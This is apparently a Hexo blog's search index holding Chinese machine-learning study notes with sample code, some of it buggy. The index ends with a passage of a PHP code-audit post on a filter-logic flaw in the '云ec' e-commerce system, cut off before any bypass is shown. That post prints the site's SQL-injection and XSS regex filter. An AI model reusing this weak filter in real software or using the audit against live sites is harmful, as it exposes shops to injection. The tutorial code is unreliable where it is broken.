<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[人脸检测实战]]></title>
    <url>%2F2021%2F04%2F29%2F%E4%BA%BA%E8%84%B8%E6%A3%80%E6%B5%8B%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[人脸检测实战目的：检测到人脸框 人脸检测数据源制作与网络训练（基于Caffe） （1）：数据数据获取： 1.benchmark 是一个行业基准（数据库，论文，源码，结果） 2.优秀论文，通常实验阶段都会介绍它所使用的数据集，公开数据集可以下载，申请数据集的时候最好使用学校邮箱。 3.论坛或者交流社,比如thinkface 4.数据的规模是越大越好，今天的数据量是2w+ 二分类数据：第一类人脸，第二类非人脸 人脸数据：路径/xxx.jpg 60 ,80 280 320 (数字为人脸左上角和右下角的坐标) 非人脸数据：只要不是人脸都是可以 对于正样本：裁剪操作，根据标注的坐标把人脸裁剪出来，可以使用opencv这个工具，来完成人脸数据源制作。要检查一下数据。 对于负样本：IOU（重叠比例）&lt;0.3，进行随机的裁剪，IOU&lt;0.3认为是负样本，最好是拿没有人脸数据当负样本。 制作LMDB数据源（其实就是caffe支持的非常常用的分类数据源） 做2分类可以放两个文件夹，10分类可以放10个文件夹 写两个txt文档文件 Train.txt: 0/xx.jpg 0 1/xx.jpg 1 val.txt xxx.jpg 0 xxx.jog 1 制作]]></content>
      <tags>
        <tag>人工智能实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[周志华《机器学习》笔记]]></title>
    <url>%2F2021%2F04%2F28%2F%E5%91%A8%E5%BF%97%E5%8D%8E%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[注：第一章绪论略 第二章2.1经验误差与过拟合 m个样本，a个分类错误，错误率:E = a/m 精度 = 1 - 错误率 , 精度 ：1 - a/m 预测输出与样本的真实输出之间的差异叫误差 学习器在训练集上的误差称为 “ 训练误差” 或者 “经验误差” 在新样本上的误差称为 “泛化误差“ 当学习器把训练样本学习的”太好“的时候，会导致泛化性下降，意思就是说面对新样本，效果不佳。这种现象叫做过拟合。（反过来，训练不够，导致欠拟合） 出现过拟合，不可避免，只能缓解，欠拟合，学习能力不足，加大学习 理想的解决方案是对候选模型泛化误差进行评估，然后选择泛化误差最小的模型。 2.2模型评估方法​ 通过”测试集“来调试学习器对新样本的判别能力，然后以测试集上的”测试误差”作为“泛化误差”的近似。 测试样本： 从样本真实分布中独立同分布采样 与训练集尽快可能互斥（未出现，未使用过的） 举例：你是一个老师，教了学生10道题目，你对他进行考试时，肯定考的不是这10道题目，这样才能体现举一反三的能力。 但是，我们只有一个包含m个样例的数据集D = {(x_1,y_1),(x_2,y_2)….(xn,yn)}怎么去做到又训练又测试呢？ 对D适当的处理，产生训练集S和测试集T 2.2.1留出法 ”留出法“直接将数据集D划分为两个互斥集合，一个训练集合S，一个测试集合T，也就是说D=S并T，S交T等于空集，在S上训练，在T评估。 举例：D = 1000个，训练 S = 700个，测试T = 300T，测试中有90个出错，错误率为（90/300）*100%=30%，精度为1-30%=70% 注意：训练/测试划分要尽能与数据分布一致 保留类别比例的采样方式称为“分层采集” 如：D=1000个=500个正+500个反 则 S = 700个= 350个正+350个反 ​ T = 300个 = 150个正+150个反 然而，即便如此分类比例，在实际中先正先反也会产生不同结果，所以单次“留出法”并不可靠，一般采用若干随机划分。重复实验取平均值。 常见的方法：2/3~4/5样本用于训练，剩余用于测试。 2.2.2交叉验证法将数据集D划分为K个大小相似的互斥子集。每个子集D_i都互斥（也就是说D等于所有子集的并，任意两个子集的交集为空集）能与数据分布保存一致，也就是“分层采样” 每次用k-1个子集的并集作为训练集，余下子集为测试集。最终返回K个测试结果的均值。叫做”K折交叉验证“，K通常取10，称为10折交叉验证 将数据集D划分为K个子集同样存在各种划分方式，为减少因样本划分不同而引入的差别，通常要随机使用不同的划分，重复P次。最终结果是第P次K折交叉验证的均值 比较常见：10次10折交叉验证 特例：留一法 数据集D中包含m个样本，令k=m，则每次只留一个测试。留一法不受随机样本划分方式的影响。 结果比较准确，就是数据量大的时候，计算量太大。 2.2.3自助法以自助采样法为基础，绘制包含m个样本的数据集D。 采样D_1：每次从D中随机选一个样本，放入D_1中，然后该样本在D中仍保留，使得该样本下次采样也能被采集到；重复m次，得到包含m个样本的数据集D_1(D中有一部分在D_1中重复出现，有一部分从未出现) 样本在m次采样中始终不被采访到的概率： 2.2.4调参与最终模型算法都有些参数需要设定，参数配置不同，模型性能不同。 调参 = 参数调剂 调参与算法选择本质上是一致的：不同配置得到不同模型，把最好的模型参数作为结果。 在实际操作中，参数选定是一个范围加一个变化步长。如[0,0.2]以0.05为参长，有0，0.05，0.1，0.15，0.2这五种参数选择，这已经是计算机开销和性能估计的折中。 然而，假定3个参数，每个参数有五种选择，模型将有5的3次方先当与125种需要比对。 用测试集上的判别效果来估计模型在实际使用中的泛化能力，把训练集分为：训练集和验证集 并且要对训练集上的性能进行模型选择和调参。 2.3性能度量用来衡量模型泛化能力的标准评价。 性能度量反映了任务需求，在对比相同模型能力时，采用不同的性能度量往往会导致不同的评判结果；模型的“好坏”是相对的。 预测任务中，样例D{（x_1,y_1）,(x_2,y_2),……(x_m,y_m)}其中y_i是示例x_i的真实标记。要评估学习器f的性能，就要把预测结果f(x)与真实标记y比较 回归任务最常用的性能度量是“均方误差” 更一般的，数据分布D和概率P(),均方差为 2.3.1 错误率与精度错误率是分类错误占的比例 精度是分类正确占比例 错误率定义： 正确率定义： 更一般的表示方法：数据分布D，概率密度p() 2.3.2查准（准确率）率，查全（召回率）率与F1错误率和精度虽然常用，但是部分均合需求不同。例如用户关心，“挑出西瓜中有多少是好瓜？这个比例是多少？” 二分类问题，根据真实的类别与学习器预测类别的组合为： 这种情况：TP+FP+TN+FN = 样例总数 查 准率 P=TP/(TP+FP) 查全率 P = TP/(TP+FN) 查准率，查全率是一对矛盾的量 一般来说，查准率高，查全率低 ​ 查准率低，查全率高 只有在一下简单的任务中才能使查准率，查全率都很高 2.3.2查准率P，查全率R 在很多情况下，根据预测结果对样例排序，排前面的‘最可能’是正例的样本，排后面的是‘最不可能’是正例的样本。 按此顺序逐个把样本做为正例进行预测，计算当前P，R值。得到“P-R曲线”，称为P-R图 若一个学习器的P-R曲线被另一个包住，完全”包住“，则可断言前者伏于后果，如A&gt;C,而A，B不能随意下定论，只能是具体情况具体分析。 笔记合理的方法是对比曲线下面面积的大小，但是不好估算，于是有了3个综合考虑，查准率，查全率的性能度量。 2.3.2查准率，查全率R，F1 很多时候有多个二分类混淆矩阵 希望在n个二分类混淆矩阵上综合考虑查准率，查全率 最直接的做法，分别计算各混淆矩阵上的R和P记（P1，R1），（P2，R2）…（Pn，Rn）求平均值 还可以将混淆矩阵对应元素平均，得到TP，FP，TN，FN，的平均值。 混淆矩阵： 第三章 线性模型3.1基本形式d 个属性描述示例x = (x1,x2,…..,xd)其中xi是x在第i个属性取值线性模型（liner model）通过属性的线性组合预测。 w,b学得后，模型确定 线性模型有很好的解释性，更多非线性模型，可在线性模型的基础上 引入层级结构或高维映射可得。 3.2线性回归数据集D= {(x1,y1),(x2,y2),(x3,y3)…….(xm,ym)}其中xi = （xi1,……xid）,yi属于R 先当于 D = {（xi,yi）}i的范围从1到m ，其中xi属于R “有序关系”：连续转化为连续值，如高矮{1，0} ​ 高中低{1，0.5，0} “不存在有序关系”：k个属性值，k维向量（0，0，1）（0，1，0）（1，0，0）转为向量 线性回归试图学得 f(xi) = wxi + b 使得 f(xi)约等于yi 怎么去确定w，b呢 (w*,b*) = arrgmin (f(xi)-yi)^2的累加等于arrgmin(yi-wxi-b)^2 最小二乘法：E(w,b) = ∑(yi - wxi - b)^2 其求解过程称为线性回归模型的最小二乘法“参数估计” 令上两个公式等0 可以求出w，b的值为 多元线性回归 更一般的d个属性：f(xi) = w的转置Xi + b 使得 f(xi) 约等于yi 进一步可得出 把w和b吸收为一个W = （w,b）.数据集D表示为（m*（d+1））大小矩阵]]></content>
      <tags>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习笔记（一）]]></title>
    <url>%2F2021%2F04%2F26%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[深度学习笔记（一） 第一章 深度学习必备知识点深度学习的套路 与机器学习套路一样1.收集数据并给定标签2.训练一个分类器3.测试，评估 def train(train_images,train_labels) return model def predict(model,test_images) return model ​ K-近邻对于未知类别属性数据集的中点 1.计算已知类别数据集中的点与当前点的距离。 2.按照距离依次排序。 3.选取与当前点距离最小的K个点。 4.确定前K个点所在类别的出现概率。 5.返回前K个点出现频率最高的类别作为当前点预测分类。 注：KNN不需要训练集进行训练，训练时间复杂度为0，计算复杂度与文档数成正比。 数据库样例：CIFAR-10 10类标签，50000个测试数据，10000个测试数据，大小32*32 KNN怎么计算呢？ 对测试图像矩阵与训练矩阵的差得到的矩阵求和 K-近邻代码： 12345678910111213141516import numpy as npclass NearestNeighbor def __init__(self) pass def train(self,X,y) self.Xtr = x self.Ytr = y def predict(self,X) num_test = X.shape[0] Ypred = np.zeros(num_test,dtype = self.ytr.dtype) # for i in xrang(num_test): distance = np.sum(np.abs(self.Xtr-X[i,:]),axis = 1) min_index = np.argmin(distance)#得到最小距离 Ypred[i] = self.ytr[min_index] return Ypred 一般把距离叫做超参数，是可以更改的。 不同的变换不能用K-近邻来表示图像分类 神经网络实例： 权重矩阵*像素矩阵+偏置值=分类矩阵 预测错误怎么办？ 采用损失函数：如SVM函数，损失值高就有问题了 如下图，设W1，W2，为两个模型，第一个模型，只考虑了第一个像素，虽然可能结果一样。 第一个模型只关注一部分，会导致过拟合。 为了解决这个问题，需要加入一个正则化，就是正则惩罚项 终极版的损失函数 sigmoid函数代码： 12def sigmoid(x): return 1.0/(1+np.exp(-x)) Softmax分类器：（归一化的分类概率） 一个大的数可以映射成一个更大的数，小的映射大不了多少。 在log的（0，1）范围内，概率等于1，损失值为0，概率越小，损失值越大，符合log函数，要加上负号。 最优化softmax：（永远有损失值） 机器学习不断的优化过程：跟下山很像，虽然可能有稍微的起伏，但是总体上是往下。 跟随梯度： 假设有4000张图片，一次跑完叫一个epoch 学习率：学习率太大会错过最低值 反向传播： 第二章神经网络模型 非线性结构，加入激活函数使怎加非线性 sigmoid 函数的缺点，一直求导会导致梯度消失，就不能反向传播。 123456数据预处理x-=np.mean(X,axis=0)x/=np.std(X,axis=0)权重初始化：W = 0.01*np.random.randn(D,H)b可以初始化为1或0 实现线性回归实战步骤与代码记录如下 12345678910111213141516171819202122&apos;&apos;&apos;1.构建模型y=w1*x1+w2*x2.....+b2.构建损失函数 均方误差3.优化损失 梯度下降 使用梯度下降优化损失，当损失最小时候所对应的权重和偏置就是我们想要的模型参数 设计方案： 1.准备数据 假定随机指定100个点，只有一个特征。x和y之间的关系满足y=kx+b。x = (100,1) 真是的y_true = (100，1) 数据分布满足y = 0.8*x +0.7 x (100,1)* weight (1,1) +bias(1,I)= y_true (100,1) 预测y_predict = tf. matmul(x, weight) +bias 2构造损失函数 用的是均方误差 erro = tf.reduce_mean(tf.square(y_predict-y_true)) 3.优化损失 optimizer = tf.train.GradienDescentOptimizer(learing_rate=0.01).minimize(error) 最后需要在会话中不断迭代optimizer 当损失最小的时候获取模型参数&apos;&apos;&apos; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081def linear_regression(): #1.准备数据 with tf.compat.v1.variable_scope(&apos;prepare_data&apos;):#增加命名空间 x = tf.compat.v1.random_normal(shape=[100,1],name=&apos;feature&apos;) y_true = tf.compat.v1.matmul(x,[[0.8]])+0.7 with tf.compat.v1.variable_scope(&apos;ceate_mode&apos;): # 增加命名空间 #构造权重和偏置，使用变量来创建 weight = tf.Variable(initial_value=tf.compat.v1.random_normal(shape=[1,1]),name=&apos;weight&apos;) bias = tf.Variable(initial_value=tf.compat.v1.random_normal(shape=[1, 1]),name=&apos;bias&apos;) y_predict = tf.matmul(x,weight)+bias with tf.compat.v1.variable_scope(&apos;loss_function&apos;): # 增加命名空间 #2.构造损失函数 error = tf.reduce_mean(tf.square(y_predict-y_true))#均方 with tf.compat.v1.variable_scope(&apos;optimizer&apos;): # 增加命名空间 #3.优化损失 optimizer=tf.compat.v1.train.GradientDescentOptimizer(learning_rate=0.1).minimize(error) #(2)增加变量显示 收集变量 tf.compat.v1.summary.scalar(&apos;erro&apos;,error) tf.compat.v1.summary.histogram(&apos;weights&apos;, weight) tf.compat.v1.summary.histogram(&apos;bias&apos;, bias) #(3)增加变量显示 合并变量 merged=tf.compat.v1.summary.merge_all() #(1)保存模型 创建saver对象 saver = tf.compat.v1.train.Saver() #初始化变量 init = tf.compat.v1.global_variables_initializer() with tf.compat.v1.Session() as sess: sess.run(init) #训练 print(&quot;训练前查看模型参数：权重：%f,偏置：%f,损失：%f&quot;%(sess.run(weight),sess.run(bias),sess.run(error))) #(1)增加变量显示 创建事件文件 fileWriter = tf.compat.v1.summary.FileWriter(&apos;G://pycode//study&apos;,graph=sess.graph) for i in range(100): sess.run(optimizer) print(&quot;训练%d次后查看模型参数：权重：%f,偏置：%f,损失：%f&quot; % ((i+1),sess.run(weight), sess.run(bias), sess.run(error))) # (4)运行合并变量 summary=sess.run(merged) # (5)增加变量显示 将变量写入事件文件 fileWriter.add_summary(summary,i) #(2)保存模型 if(i%10==0): saver.save(sess, &apos;./ckpt/linear_regression.ckpt&apos;)#读取模型def restore_demo(): #1.准备数据 with tf.compat.v1.variable_scope(&apos;prepare_data&apos;):#增加命名空间 x = tf.compat.v1.random_normal(shape=[100,1],name=&apos;feature&apos;) y_true = tf.compat.v1.matmul(x,[[0.8]])+0.7 with tf.compat.v1.variable_scope(&apos;ceate_mode&apos;): # 增加命名空间 #构造权重和偏置，使用变量来创建 weight = tf.Variable(initial_value=tf.compat.v1.random_normal(shape=[1,1]),name=&apos;weight&apos;) bias = tf.Variable(initial_value=tf.compat.v1.random_normal(shape=[1, 1]),name=&apos;bias&apos;) y_predict = tf.matmul(x,weight)+bias with tf.compat.v1.variable_scope(&apos;loss_function&apos;): # 增加命名空间 #2.构造损失函数 error = tf.reduce_mean(tf.square(y_predict-y_true))#均方 with tf.compat.v1.variable_scope(&apos;optimizer&apos;): # 增加命名空间 #3.优化损失 optimizer=tf.compat.v1.train.GradientDescentOptimizer(learning_rate=0.1).minimize(error) #(2)增加变量显示 收集变量 tf.compat.v1.summary.scalar(&apos;erro&apos;,error) tf.compat.v1.summary.histogram(&apos;weights&apos;, weight) tf.compat.v1.summary.histogram(&apos;bias&apos;, bias) #(3)增加变量显示 合并变量 merged=tf.compat.v1.summary.merge_all() #(1)保存模型 创建saver对象 saver = tf.compat.v1.train.Saver() #初始化变量 init = tf.compat.v1.global_variables_initializer() with tf.compat.v1.Session() as sess: sess.run(init) #训练 print(&quot;训练前查看模型参数：权重：%f,偏置：%f,损失：%f&quot;%(sess.run(weight),sess.run(bias),sess.run(error))) #(1)增加变量显示 创建事件文件 fileWriter = tf.compat.v1.summary.FileWriter(&apos;G://pycode//study&apos;,graph=sess.graph) #读取模型 #判断模型是否存在 ckpt = tf.compat.v1.train.get_checkpoint_state(&apos;./ckpt/&apos;) if ckpt and ckpt.model_checkpoint_path: saver.restore(sess,&apos;./ckpt/linear_regression.ckpt&apos;) print(&quot;训练后模型参数：权重：%f,偏置：%f,损失：%f&quot; % (sess.run(weight), sess.run(bias), sess.run(error) mnist数据集上的手写数字识别实战代码贴上 123456789101112131415161718192021222324252627282930313233343536373839404142from tensorflow.examples.tutorials.mnist import input_dataimport tensorflow.compat.v1 as tfdef mnist_demo(): #加载数据集 mnist = input_data.read_data_sets(&apos;G:/pycode/study/data&apos;,one_hot=True) images,labels = mnist.train.next_batch(100) # print(&apos;images.shape:&apos;,images.shape,&apos;labels.shape:&apos;,labels.shape) #1.准备数据 x = tf.placeholder(dtype=tf.float32,shape=[None,784])#28*28 y_true = tf.placeholder(dtype=tf.float32,shape=[None,10]) #2.构建模型 x(none,784)* weight(784,10) +bias = y(None,10) weight = tf.Variable( initial_value=tf.random_normal(shape=[784,10])) bias = tf.Variable(initial_value=tf.random_normal(shape=[10])) y_predict = tf.matmul(x,weight)+bias #3.构建损失函数 softmax 交叉熵损失 error = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(labels=y_true,logits=y_predict)) #4.优化损失 optimizer = tf.train.GradientDescentOptimizer(learning_rate=0.1).minimize(error) #保存模型 创建saver对象 saver=tf.train.Saver() #初始化变量 init = tf.global_variables_initializer() #开启会话 with tf.Session() as sess: #运行初始化变量 sess.run(init) print(&quot;训练模型前的损失：%f&quot; %(sess.run(error,feed_dict=&#123;x:images,y_true:labels&#125;))) #训练 # for i in range(1000): # op,loss =sess.run([optimizer,error],feed_dict=&#123;x:images,y_true:labels&#125;) # print(&apos;第%d次训练模型的损失：%f&apos; %((i+1),loss)) # #(2)保存模型 # if i%10==0: # saver.save(sess,&apos;./ckpt/mnist.ckpt&apos;) ckpt = tf.compat.v1.train.get_checkpoint_state(&apos;./ckpt/&apos;) if ckpt and ckpt.model_checkpoint_path: saver.restore(sess, &apos;./ckpt/mnist.ckpt&apos;) print(&quot;训练后模型参数损失：%f&quot; % (sess.run(error,feed_dict=&#123;x:images,y_true:labels&#125;)))if __name__ == &apos;__main__&apos;: tf.compat.v1.disable_eager_execution() mnist_demo() 第三章神经网络案例实战手动实现简易三层神经网络12345678910111213141516171819202122232425262728293031323334353637383940414243import numpy as npdef sigmoid (x,derive=False):#derive=False不需要求导 if(derive==True):#反向传播进行求导其X=1/(1+np.exp(-x)) return x*(1-x) return 1/(1+np.exp(-x))#五个样本，三个特征x=np.array([[0,0,1], [0,1,1], [1,0,1], [1,1,1], [0,0,1]] )#标签y=np.array([[0], [1], [1], [0], [0]] )np.random.seed(1)#定义三层神经网络#两个权重矩阵#*2-1是为了使范围在（-1，1）w0 = 2*np.random.random((3,4))-1#前面连3个特征，后面连四个神经元w1 = 2*np.random.random((4,1))-1#前连四个神经元，只有一个输出列for j in range(60000): l0=x#l0为输入层 l1 = sigmoid(np.dot(l0,w0)) #l2为输出层 l2 = sigmoid(np.dot(l1,w1)) #均方误差项1/2(y-y*)^2求导后为y-y* l2_error = y-l2 #print(l2_error.shape) if(j%10000)==0: print(&apos;Error&apos;+str(np.mean(np.abs(l2_error)))) l2_delta = l2_error * sigmoid(l2,derive=True)# #print(l2_delta.shape) l1_error = l2_delta.dot(w1.T)#需要对w1进行转置操作 l1_delta = l1_error*sigmoid(l1,derive=True) #完成上面的反向传播后进行更改值 w1 += l1.T.dot(l2_delta) w0 += l0.T.dot(l1_delta) 神经网络的全连接分类实现普通练习： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import numpy as npdef sigmoid (x,derive=False):#derive=False不需要求导 if(derive==True):#反向传播进行求导其X=1/(1+np.exp(-x)) return x*(1-x) return 1/(1+np.exp(-x))#五个样本，三个特征x=np.array([[0,0,1], [0,1,1], [1,0,1], [1,1,1], [0,0,1]] )#标签y=np.array([[0], [1], [1], [0], [0]] )np.random.seed(1)#定义三层神经网络#两个权重矩阵#*2-1是为了使范围在（-1，1）w0 = 2*np.random.random((3,4))-1#前面连3个特征，后面连四个神经元w1 = 2*np.random.random((4,1))-1#前连四个神经元，只有一个输出列for j in range(5): l0=x#l0为输入层 l1 = sigmoid(np.dot(l0,w0)) #l2为输出层 l2 = sigmoid(np.dot(l1,w1)) #均方误差项1/2(y-y*)^2求导后为y-y* l2_error = y-l2 #print(l2_error.shape) if(j%10000)==0: print(&apos;Error&apos;+str(np.mean(np.abs(l2_error)))) l2_delta = l2_error * sigmoid(l2,derive=True)# #print(l2_delta.shape) l1_error = l2_delta.dot(w1.T)#需要对w1进行转置操作 l1_delta = l1_error*sigmoid(l1,derive=True) #完成上面的反向传播后进行更改值 w1 += l1.T.dot(l2_delta) w0 += l0.T.dot(l1_delta) 手写神经网络训练图片： 部分代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152神经网络传播过程#day2_CIFAR_10.pyfrom layer_utils import *import numpy as npclass TwoLayerNet(object): def __int__(self,input_dim=3*32*32,hidden_dim=100,num_classes=10,weight_scale=1e-3,reg=0.0): &quot;&quot;&quot; :param input_dim: 输入数据的大小:3*32*32的彩色图 :param hidden_dim:隐藏层的神经元的 个数 :param num_classes:类别数 :param weight_scale:随基初始化的权重 :param reg:惩罚的权重项 :return: &quot;&quot;&quot; self.params=&#123;&#125; self.reg = reg self.params[&apos;w1&apos;] = weight_scale * np.random.randn(input_dim,hidden_dim) self.params[&apos;b1&apos;] = np.zeros((1,hidden_dim))#偏置项拿0初始化 self.params[&apos;w2&apos;] = weight_scale *np.random.randn(hidden_dim,num_classes) self.params[&apos;b2&apos;] = np.zeros(1,num_classes)#偏置项拿0初始化 def loss (self,X,y=None): &quot;&quot;&quot; :param x: :param y: :return: &quot;&quot;&quot; scores = None N = X.shape[0] w1,b1 = self.params[&apos;w2&apos;],self.params[&apos;b1&apos;] w2,b2 = self.params[&apos;w2&apos;],self.params[&apos;b2&apos;] h1,cache1 = affine_relu_forward(X,w1,b1)#h1：中间输出结果 out,cache2 = affine_forward(h1,w2,b2) scores = out#每个类别的得分值 if y is None: return scores loss,grads = 0 ,&#123;&#125;#存梯度的值 data_loss,dscores = softmax_loss(scores,y) reg_loss = 0.5 * self.reg*np.sum(w1*w1) + 0.5 *self.reg*np.sum(w2*w2)#正则化 loss = data_loss + reg_loss dh1,dw2,db2 = affine_backward(dscores,cache2) dx,dw1,db1 = affine_relu_bacekward(dh1,cache1) dw2+= self.reg*w2 dw1+= self.reg*w1 grads[&apos;w1&apos;] = dw1 grads[&apos;b1&apos;] = db1 grads[&apos;w2&apos;] = dw2 grads[&apos;b2&apos;] = db2 return loss ,grads各层值的传播函数如下：import numpy as npdef affine_relu_forward(x,w,b): a,fc_cache = affine_forward(x,w,b) out,relu_cache = relu_forward(a) cache = (fc_cache,relu_cache) return out,cachedef relu_backward(dout,cache): &quot;&quot;&quot; :param dout: :param cache: :return: &quot;&quot;&quot; dx,x = None,cache dx=doutdef affine_backward(dout,cache): &quot;&quot;&quot; :param dout: :param cache: :return: &quot;&quot;&quot; x,w,b = cache dx,dw,db = None,None,None dx = np.dot(dout,w.T) dx = np.reshape(dx,x.shape) x_row = x.reshape(x.shape[0],-1) dw = np.dot(x_row.T,dout) db = np.sum(dout,axis=0,keepdims=True) return dx ,dw ,db# def affine_forward(x,w,b):# &quot;&quot;&quot;def affine_forward(x,w,b): &quot;&quot;&quot; :param x: :param w: :param b: :return: &quot;&quot;&quot; out = None N = x.shape[0] x_row = x.reshape[N,-1] out = np.dot(x_row,w)+b cache = (x,w,b) return out,cachedef affine_relu_forward(x,w,b): &quot;&quot;&quot; :param x: :param w: :param b: :return: &quot;&quot;&quot; a,fc_cache = affine_forward(x,w,b)#全连接后的值 out,relu_cache = relu_backward(a)#经过relu层后的值 cache = (fc_cache,relu_cache) return out ,cachedef affine_relu_bacekward(dout,cache): fc_cache,relu_cache = cache da = relu_backward(dout,relu_cache) dx,dw,db = affine_backward(da,fc_cache) return dx,dw,dbdef relu_forward(x): &quot;&quot;&quot; :param x: :return: &quot;&quot;&quot; out = None out = ReLU(x) cache = x return out,cachedef relu_backward(dout,cache): dx,x=None,cache dx = dout dx [x&lt;=0]= 0 return dxdef affine_relu_backward(dout,cache): fc_cache,relu_cache = cache da = relu_backward(dout,fc_cache) dx,dw,db = affine_backward(da,fc_cache) return dx,dw,dbdef ReLU(x): return np.maximum(0,x)#比0大取x，小取0def softmax_loss(x,y): &quot;&quot;&quot; :param x: :param y: :return: &quot;&quot;&quot; probs = np.exp(x-np.max(x,axis=1,keepdims=True))#归一化操作 probs/= np.sum(probs,axis=1,keepdims=True) N = x.shape[0] loss = -np.sum(np.log(probs[np.arange(N),y]))/N dx = probs.copy() dx[np.arange(N),y]-=1#softmax 层求梯度的过程 dx/=N 第四章卷积神经网络介绍步骤：准备数据—&gt;在图中前向传播得到损失函数—-&gt;反向传播计算梯度值—-&gt;更新参数的一次循环 应用：识别，检索，物体检测，元素分离（GPU） 卷积神经网络的组成：输入层，卷积层，激活函数，池化层，全连接层 一张图片—-&gt;低级特征提取—-&gt;中级特征提取—-&gt;高级特征提取—–&gt;可训练的分类器 计算过程 滑动的步长：stride = 2，如果是一个7x7的输入得到一个3x3的输出 可以加上一圈padding项使图片的边缘信息变成非边缘，有利于利用边缘信息，可以用0填充。Pad=1加1圈，Pad=2加两圈 计算输出大小例子： 输入 = 7x7 ,Filter = 3x3,pad = 1,stride=1(步长),Outpout=? h_I=w_I=7 Filter_h=Filter_w=3 h_o=(h_I-Filter_h+2Pad)/stride+1=7 w_o=(w_I-Filter_w+2Pad)/stride+1=7 池化层（Pooling layer）两种方式： mean方式：将一个区域的值起来求均值作为一个特征 max方式：取一个区域中的最大值作为这个区域的特征 maxPoolin 前向传播： 123456789101112131415def max_pool_forward_naive(x, pool_param): HH, WW = pool_param[&apos;pool_height&apos;], pool_param[&apos;pool_width&apos;] s = pool_param[&apos;stride&apos;] N, C, H, W = x.shape H_new = 1 + (H - HH) / s W_new = 1 + (W - WW) / s out = np.zeros((N, C, H_new, W_new)) for i in range(N): for j in range(C): for k in range(H_new): for l in range(W_new): window = x[i, j, k*s:HH+k*s, l*s:WW+l*s] out[i, j, k, l] = np.max(window) cache = (x, pool_param) return out, cache maxPoolin 项反向传播： 12345678910111213141516def max_pool_backward_naive(dout, cache): x, pool_param = cache HH, WW = pool_param[&apos;pool_height&apos;], pool_param[&apos;pool_width&apos;] s = pool_param[&apos;stride&apos;] N, C, H, W = x.shape H_new = 1 + (H - HH) / s W_new = 1 + (W - WW) / s dx = np.zeros_like(x) for i in range(N): for j in range(C): for k in range(H_new): for l in range(W_new): window = x[i, j, k*s:HH+k*s, l*s:WW+l*s] m = np.max(window) dx[i, j, k*s:HH+k*s, l*s:WW+l*s] = (window == m) * dout[i, j, k, l] return dx RNN 我这几天的Py]]></content>
      <tags>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.1过滤逻辑错误审计]]></title>
    <url>%2F2019%2F09%2F28%2F2-1%E8%BF%87%E6%BB%A4%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 简介 本文审计的系统为云ec电商系统版本1.2.3，网上也有审计文章这里主要是讲讲，有些程序可能本身他的过滤代码还是比较不错，但是逻辑问题造成了过滤函数没有起作用。 0x01 实例审计还是先从index.php文件看进去吧！ 12345678910111213141516171819202122232425262728&lt;?phpdefine(&apos;in_mx&apos;, TRUE);$ym_version=&apos;1.2.3&apos;;$p=isset($_GET[&apos;p&apos;]) ? addslashes($_GET[&apos;p&apos;]) : &apos;&apos;;$p=(trim($p)==&apos;&apos;) ? &apos;index&apos; : trim($p);require(&quot;./inc/function/global.php&quot;);switch ($p)&#123; case &apos;admin&apos;: include(&quot;./inc/function/global_admin&quot;.Ext); exit(); break; case &apos;install&apos;: require(&quot;./install/index&quot;.Ext); exit(); break; default: if(strpos($p, &quot;n-&quot;)===0 || $ym_url_path[0] === &apos;news&apos;)&#123; include(&quot;./inc/function/global_news&quot;.Ext); &#125; else&#123; include(&quot;./inc/function/global_page&quot;.Ext); &#125; break;&#125;?&gt; 从index.php来看是GET获取P参数然后引用对应的文件，先来看看/inc/function/global.php 12345678910111213141516171819202122232425262728293031set_error_handler(&quot;customError&quot;,E_ERROR);$getfilter=&quot;\\b(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;$postfilter=&quot;\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;$cookiefilter=&quot;\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq)&#123; if(is_array($StrFiltValue)) &#123; $StrFiltValue=implode($StrFiltValue); &#125; if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,urldecode($StrFiltValue)))&#123; print &quot;网址有误~&quot;; exit(); &#125; &#125; foreach($_GET as $key=&gt;$value)&#123; StopAttack($key,$value,$getfilter);&#125;if ($_GET[&quot;p&quot;]!==&apos;admin&apos;)&#123; foreach($_POST as $key=&gt;$value)&#123; StopAttack($key,$value,$postfilter); &#125;&#125;foreach($_COOKIE as $key=&gt;$value)&#123; 